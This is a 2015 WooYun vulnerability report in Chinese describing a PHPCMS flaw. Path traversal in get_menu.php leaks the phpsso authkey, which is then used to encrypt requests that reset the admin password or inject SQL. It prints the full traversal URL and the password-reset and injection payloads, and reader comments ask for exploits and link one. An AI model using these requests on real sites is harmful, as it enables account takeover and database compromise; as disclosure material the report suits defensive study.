{"id": 22978, "wybug_id": "wooyun-2015-0105242", "wybug_title": "PHPCMS最新版本authkey泄露可注射拿shell", "wybug_corp": "phpcms", "wybug_author": "GLM_", "wybug_date": "2015-04-01 17:23", "wybug_open_date": "2015-06-30 17:38", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向公众公开  简要描述： authkey泄露可以导致一系列安全问题 详细说明：   WooYun: PHPCMS V9 一个为所欲为的漏洞 可以参考这篇文章，这这篇文章的作者爆了这样一个点\npublic function getapplist() {\t\t$applist = getcache('applist', 'admin');\t\texit(serialize($applist));\t}\n厂商同学直接忽略了，但是却自己修复了（不评论），修复为\npublic function getapplist() {\t\t$applist = getcache('applist', 'admin');\t\tforeach($applist as $key=>$value){\t\t\tunset($applist[$key]['authkey']);\t\t}\t\texit(serialize($applist));\n修复得很不仔细，看来厂商真的觉得这不是个洞。好啊，那么肯定就会有其它点了，既然不重视这个点，我们来看\\api\\get_menu.php:\nfunction ajax_getlist() {\t$cachefile = $_GET['cachefile'];\t$cachefile = str_replace(array('/', '//'), '', $cachefile);\t//$cachefile = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $cachefile);\t$path = $_GET['path'];\t$path = str_replace(array('/', '//'), '', $path);\t//$path = preg_replace('/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S', '', $path);\t$title = $_GET['title'];\t$key = $_GET['key'];\t$infos = getcache($cachefile,$path);\t$where_id = intval($_GET['parentid']);\t$parent_menu_name = ($where_id==0) ? '' : trim($infos[$where_id][$key]);\tforeach($infos AS $k=>$v) {\t\tif($v['parentid'] == $where_id) {\t\t\tif ($v['parentid']) $parentid = $infos[$v['parentid']]['parentid'];\t\t\t$s[]=iconv(CHARSET,'utf-8',$v['catid'].','.trim($v[$key]).','.$v['parentid'].','.$parent_menu_name.','.$parentid);\t\t}\t}\tif(count($s)>0) {\t\t$jsonstr = json_encode($s);\t\techo trim_script($_GET['callback']).'(',$jsonstr,')';\t\texit;\t\t\t\t} else {\t\techo trim_script($_GET['callback']).'()';exit;\t\t\t\t}}\n其中的getcache的两个参量是可控的。并且没有过滤反斜杠。构造合适的访问链接可以访问到cache文件夹中的配置文件，并读取内容。那么如果这样的链接会督导什么内容呢？\nhttp://www.test.org/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin\n\n\n   漏洞证明：  不过这里厂商又会忽略的。那么我们看看authkey怎么用在\\phpsso_server\\phpcms\\modules\\phpsso\\index.php中含有如下函数：\npublic function edit() {\t\t$this->email = isset($this->data['email']) ? $this->data['email'] : '';\t\t$this->uid = isset($this->data['uid']) ? $this->data['uid'] : '';\t\t$userinfo = $this->getuserinfo(1);\t\t\t\tif (isset($this->data['password']) && !empty($this->data['password'])) {\t\t\t$this->password = create_password($this->data['password'], $userinfo['random']);\t\t}\t\t\t\t$this->random = !empty($this->data['random']) ? $this->data['random'] : $userinfo['random'];\t\tif (isset($this->data['newpassword']) && !empty($this->data['newpassword'])) {\t\t\t$this->newpassword = create_password($this->data['newpassword'], $this->random);\t\t}\t\tif ($userinfo == -1) {\t\t\texit('-1');\t\t}\t\tif (isset($this->password) && !empty($this->password) && $userinfo['password'] != $this->password) {\t\t\texit('-2');\t\t}\t\tif ($this->email && $userinfo['email'] != $this->email) {\t\t\tif($this->checkemail(1) == -1) exit('-3');\t\t}\t\t\t\t\t$data = array();\t\t$data['appname'] = $this->applist[$this->appid]['name'];\t\t\t\tif (!empty($this->email) && $userinfo['email'] != $this->email) {\t\t\t$data['email'] = $this->email;\t\t}\t\tif (isset($this->newpassword) && $userinfo['password'] != $this->newpassword) {\t\t\t$data['password'] = $this->newpassword;\t\t\t$data['random'] = $this->random;\t\t}\t\tif (!empty($data)) {\t\t\t\t\t\t//ucenter部份\t\t\tif ($this->config['ucuse']) {\t\t\t\tpc_base::load_config('uc_config');\t\t\t\trequire_once PHPCMS_PATH.'api/uc_client/client.php';\t\t\t\t$r = uc_user_edit($userinfo['username'], '', (isset($this->data['newpassword']) && !empty($this->data['newpassword']) ? $this->data['newpassword'] : ''), $data['email'],1);\t\t\t\tif ($r != 1) {\t\t\t\t //{-1:用户不存在;-2:旧密码错误;-3:email已经存在 ;1:成功;0:未作修改}\t\t\t\t\tswitch ($r) {\t\t\t\t\t\tcase '-1':\t\t\t\t\t\t\texit('-2');\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase '0':\t\t\t\t\t\t\t\t\t\tcase '-4':\t\t\t\t\t\t\t\t\t\t\t\tcase '-5':\t\t\t\t\t\t\t\t\t\t\t\tcase '-6':\t\t\t\t\t\tcase '-7':\t\t\t\t\t\tcase '-8':\t\t\t\t\t\t\texit('0');\t\t\t\t\t\tbreak;\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\tif (empty($data['email'])) unset($data['email']);\t\t\t\t\t/*插入消息队列*/\t\t\t$noticedata = $data;\t\t\t$noticedata['uid'] = $userinfo['uid'];\t\t\tmessagequeue::add('member_edit', $noticedata);\t\t\tif($this->username) {\t\t\t\t$res = $this->db->update($data, array('username'=>$this->username));\t\t\t} else {\t\t\t\t$res = $this->db->update($data, array('uid'=>$this->uid));\t\t\t}\t\t\texit(\"$res\");\t\t} else {\t\t\texit('0');\t\t}\t}\n里面有数据库的操作，应该是用于密码更改的。我们来构造一个data数据，加密前：\nuid=1&newpassword=admin123456\n利用上面的authkey以及cms自带的加解密函数即可进行加密。在这里，我们除了可以修改密码，还可以进行注入\nuid=1&email=123'\n   修复方案：  不会修复   版权声明：转载请注明来源 GLM_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-01 17:36 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-01 23:28 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  关注下。    \n     2015-04-06 01:28 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  案例来了    \n     2015-04-06 12:01 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  你把漏洞都搞完了  以后看你怎么搞shell    \n     2015-04-07 21:30 |    \t\thope \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 一个小菜)\t\t \n  @zhxs 小神师傅 说得好     \n     2015-05-04 19:58 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @zhxs 看完漏洞我蛋都疼了。这尼玛怎么修改密码。。如何getshell，搞不明白。看不懂。标题党。我蛋疼    \n     2015-05-04 21:36 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  你怎么看细节得    \n     2015-05-05 11:13 |    \t\t流星warden \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:8        | The quieter you become,the more you are ...)\t\t \n  @scanf 目测他有厂商号    \n     2015-05-05 11:20 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  哈哈原来是这样.    \n     2015-05-05 11:22 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:15        | .)\t\t \n  坐等公开    \n     2015-05-05 17:59 |    \t\thope \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 一个小菜)\t\t \n  膜拜大牛 找朋友    \n     2015-05-22 10:04 |    \t\tfuckohyes \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小菜鸟一枚,多多关照)\t\t \n  已经知道exp了,不知道有没有dz那样的利用工具    \n     2015-05-22 10:58 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @fuckohyes exp哪里？    \n     2015-05-30 09:25 |    \t\t包包 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 我是菜鸟，我怕谁？小弟新来，望大牛多多包...)\t\t \n  mark    \n     2015-06-02 12:07 |    \t\tHotQS \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 立志把谷歌玩出花的男人！)\t\t \n  @scanf 我会告诉你bugscan已经可以扫了么    \n     2015-06-02 12:50 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  这么吊@HotQS     \n     2015-06-08 12:49 |    \t\t黑色天使 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 爱生活，爱编程。)\t\t \n  这么叼，你妈妈知道吗    \n     2015-06-10 14:07 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  这样有条件限制吧    \n     2015-06-11 11:59 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  收藏    \n     2015-06-12 17:18 |    \t\t小清新 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 以后再写)\t\t \n  拿到了authkey怎么进行的注射那   mark下  求知道的告知下    \n     2015-06-18 13:11 |    \t\tquanxian \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:2        | This is QuanXian.)\t\t \n  @微尘 @GLM_ 这个edi（）这个函数传这两个参数提示空。  注射倒是没问题    \n     2015-06-18 13:12 |    \t\tquanxian \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:2        | This is QuanXian.)\t\t \n  @quanxian edit() 修改密码这里    \n     2015-06-20 13:54 |    \t\t0x01 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | XXOO)\t\t \n  哪位大牛发下漏洞详情给我  小弟感激不尽   邮箱：sundn.gm@gmail.com          \n     2015-06-30 18:58 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手上路。)\t\t \n  给你跪拜    \n     2015-06-30 19:22 |    \t\tAlan* \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 少壮不努力，长大捡垃圾)\t\t \n  mark    \n     2015-07-01 13:36 |    \t\tbobbi \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 人生真是寂寞如雪)\t\t \n  怎么利用    \n     2015-07-06 11:08 |    \t\tB1gstar \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        | 向各位学习来了。)\t\t \n  有exp么     \n     2015-07-11 23:10 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  @GLM_ 厂商貌似没修啊    \n     2015-07-14 09:02 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  哪位大牛发下漏洞详情给我 小弟感激不尽 邮箱：4654602@qq.com    \n     2015-07-14 12:16 |    \t\t懒猫先生 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 乌云有你更精彩*)\t\t \n  求详情    \n     2015-07-15 10:32 |    \t\tstrike \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Hello world!)\t\t \n  厂商同学这下又要偷偷修复了    \n     2015-07-18 10:37 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  看的我很迷糊啊，唉~~好好学习啊    \n     2015-07-18 18:31 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  @B1gstar @scanf 才写的exp，兄弟们用吧。http://www.waitalone.cn/phpcmsv9-authkey-exp.html    \n     2015-07-18 22:53 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:16        )\t\t \n  @hack2012 ma5加salt的吧    \n     2015-07-23 04:42 |    \t\tYomis \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | exploit)\t\t \n  - -    \n     2015-07-31 09:11 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  @plane636 exp里有salt的呀，看:后面的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}